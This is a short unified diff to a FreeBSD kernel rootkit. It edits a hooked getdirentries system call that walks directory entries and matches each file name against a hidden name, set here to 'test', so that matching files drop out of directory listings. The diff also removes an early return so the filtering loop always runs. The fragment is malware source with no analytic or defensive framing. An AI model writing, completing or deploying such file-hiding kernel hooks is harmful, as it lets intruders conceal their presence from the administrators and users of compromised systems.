@@ -51,6 +51,10 @@ __FBSDID("$FreeBSD$");
 
 #include "rootkit.h"
 
+
+#define T_NAME "test"
+
+
 int
 sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 {
@@ -65,10 +69,10 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 	if (error!=0) return error;
 	if (uap->basep != NULL){
 		error = copyout(&base, uap->basep, sizeof(long));
-		return error;
+		
 	}
 	
-
+	
 	size = td->td_retval[0];
 
 	if (size > 0){
@@ -76,6 +80,7 @@ sys_getdirentries_hook(struct thread *td, struct getdirentries_args *uap)
 		copyin(uap->buf,dp,size);
 		current = dp;
 		count = size;
+
 		while((current->d_reclen != 0) && (count > 0)){
 			count -= current->d_reclen;
 			if(strcmp((char*)&(current->d_name),T_NAME) == 0){
